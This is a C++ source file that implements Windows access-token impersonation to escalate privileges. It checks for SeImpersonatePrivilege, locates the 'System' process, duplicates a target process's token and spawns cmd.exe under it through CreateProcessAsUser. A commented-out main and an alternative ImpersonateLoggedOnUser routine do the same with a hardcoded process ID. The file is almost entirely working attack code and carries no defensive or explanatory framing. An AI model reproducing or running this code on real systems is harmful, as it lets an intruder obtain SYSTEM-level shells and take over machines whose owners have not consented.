#include <windows.h>
#include <sddl.h>
#include <tlhelp32.h>
#include <string>
#include <Windows.h>
#include <iostream>
#include "ImpersToken.h"
using namespace std;

bool HasSeImpersonatePrivilege()
{
    // Get the current process token
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
    {
        std::cout << "Failed to open process token. Error code: " << GetLastError() << std::endl;
        return false;
    }

    // Check if the token has the SeImpersonatePrivilege privilege
    TOKEN_PRIVILEGES tokenPrivileges;
    LUID luid;

    if (!LookupPrivilegeValue(nullptr, SE_IMPERSONATE_NAME, &luid))
    {
        std::cout << "Failed to lookup privilege value. Error code: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return false;
    }

    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Privileges[0].Luid = luid;
    tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // Prepare the PRIVILEGE_SET structure
    PRIVILEGE_SET privilegeSet;
    privilegeSet.PrivilegeCount = 1;
    privilegeSet.Control = PRIVILEGE_SET_ALL_NECESSARY;
    privilegeSet.Privilege[0].Luid = luid;
    privilegeSet.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL result = FALSE;
    if (!PrivilegeCheck(hToken, &privilegeSet, &result))
    {
        std::cout << "Failed to check privilege. Error code: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return false;
    }

    // Clean up and return the result
    CloseHandle(hToken);
    return (result != FALSE);
}

DWORD FindSystemProcess()
{
    // Create a snapshot of the process list
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        std::cout << "Failed to create process snapshot. Error code: " << GetLastError() << std::endl;
        return 0;
    }

    // Initialize the process entry structure
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Get the first process entry
    if (!Process32First(hSnapshot, &pe32))
    {
        std::cout << "Failed to retrieve first process entry. Error code: " << GetLastError() << std::endl;
        CloseHandle(hSnapshot);
        return 0;
    }

    // Iterate through all processes
    do
    {
        // Check if the process runs as SYSTEM
        if (_wcsicmp(pe32.szExeFile, L"System") == 0 || _wcsicmp(pe32.szExeFile, L"System Idle Process") == 0)
        {
            CloseHandle(hSnapshot);
            return pe32.th32ProcessID;
        }
    } while (Process32Next(hSnapshot, &pe32));

    // Clean up and return 0 if no system process found
    CloseHandle(hSnapshot);
    return 0;
}

bool CreateProcessWithToken(DWORD targetProcessId, const wchar_t* applicationPath)
{
    // Open the target process
    HANDLE hTargetProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetProcessId);
    if (hTargetProcess == nullptr)
    {
        std::cout << "Failed to open target process. Error code: " << GetLastError() << std::endl;
        return false;
    }

    // Open the target process token
    HANDLE hTargetToken;
    if (!OpenProcessToken(hTargetProcess, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, &hTargetToken))
    {
        std::cout << "Failed to open target process token. Error code: " << GetLastError() << std::endl;
        CloseHandle(hTargetProcess);
        return false;
    }

    // Duplicate the target process token
    HANDLE hDuplicateToken;
    if (!DuplicateTokenEx(hTargetToken, MAXIMUM_ALLOWED, nullptr, SecurityImpersonation, TokenPrimary, &hDuplicateToken))
    {
        std::cout << "Failed to duplicate target process token. Error code: " << GetLastError() << std::endl;
        CloseHandle(hTargetToken);
        CloseHandle(hTargetProcess);
        return false;
    }

    // Close the original handles
    CloseHandle(hTargetToken);
    CloseHandle(hTargetProcess);

    // Create the new process with the duplicated token
    STARTUPINFO startupInfo{};
    PROCESS_INFORMATION processInfo{};
    if (!CreateProcessAsUser(hDuplicateToken, nullptr, const_cast<wchar_t*>(applicationPath), nullptr, nullptr, FALSE, CREATE_NEW_CONSOLE, nullptr, nullptr, &startupInfo, &processInfo))
    {
        std::cout << "Failed to create process as user. Error code: " << GetLastError() << std::endl;
        CloseHandle(hDuplicateToken);
        return false;
    }

    // Close the duplicated token handle
    CloseHandle(hDuplicateToken);

    // Close the process handles
    CloseHandle(processInfo.hProcess);
    CloseHandle(processInfo.hThread);

    return true;
}
/*bool ImpersonateSystemProcess(DWORD targetProcessId, const wchar_t* applicationPath)
{
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetProcessId);
    if (hProcess == nullptr)
    {
        std::cout << "Failed to open target process. Error code: " << GetLastError() << std::endl;
        return false;
    }

    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, &hToken))
    {
        std::cout << "Failed to open process token. Error code: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    HANDLE hTokenDuplicate;
    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, nullptr, SecurityImpersonation, TokenPrimary, &hTokenDuplicate))
    {
        std::cout << "Failed to duplicate process token. Error code: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return false;
    }

    CloseHandle(hToken);
    CloseHandle(hProcess);

    TOKEN_PRIVILEGES privileges;
    privileges.PrivilegeCount = 1;
    LookupPrivilegeValue(nullptr, SE_IMPERSONATE_NAME, &privileges.Privileges[0].Luid);
    privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hTokenDuplicate, FALSE, &privileges, 0, nullptr, nullptr))
    {
        std::cout << "Failed to enable SeImpersonatePrivilege. Error code: " << GetLastError() << std::endl;
        CloseHandle(hTokenDuplicate);
        return false;
    }

    if (!ImpersonateLoggedOnUser(hTokenDuplicate))
    {
        std::cout << "Failed to impersonate process token. Error code: " << GetLastError() << std::endl;
        CloseHandle(hTokenDuplicate);
        return false;
    }

    STARTUPINFO startupInfo{};
    PROCESS_INFORMATION processInfo{};
    if (!CreateProcessAsUser(hTokenDuplicate, nullptr, const_cast<wchar_t*>(applicationPath), nullptr, nullptr, FALSE, CREATE_NEW_CONSOLE, nullptr, nullptr, &startupInfo, &processInfo))
    {
        std::cout << "Failed to create process as user. Error code: " << GetLastError() << std::endl;
        RevertToSelf();
        CloseHandle(hTokenDuplicate);
        return false;
    }

    CloseHandle(hTokenDuplicate);
    CloseHandle(processInfo.hProcess);
    CloseHandle(processInfo.hThread);

    RevertToSelf();

    return true;
}*/
// main
/*int main() {
	if (HasSeImpersonatePrivilege()) {
		printf("seimpersonate privilege is enabled!!\n");
	}
	else {
		printf("seimpersonate privilege is disabled!!\n");
	}
    DWORD systemProcessID = FindSystemProcess();

    if (systemProcessID != 0)
    {
        std::cout << "Found system process with ID: " << systemProcessID << std::endl;
    }
    else
    {
        std::cout << "No system process found." << std::endl;
    }
    DWORD targetProcessId = 7804; // Replace with the desired target process ID
    const wchar_t* applicationPath = L"C:\\Windows\\System32\\cmd.exe"; // Replace with the desired application path

    if (CreateProcessWithToken(targetProcessId, applicationPath))
    {
        std::cout << "New process created successfully." << std::endl;
    }
    else
    {
        std::cout << "Failed to create new process." << std::endl;
    }
    
    //DWORD targetProcessId = 13320; // Replace with the desired target process ID
    //const wchar_t* applicationPath = L"C:\\Windows\\System32\\cmd.exe"; // Replace with the desired application path

    //if (ImpersonateSystemProcess(targetProcessId, applicationPath))
    //{
    //    std::cout << "New process created successfully." << std::endl;
    //}
    //else
    //{
    //    std::cout << "Failed to create new process." << std::endl;
    //}

    
    getchar();
    return 0;
}*/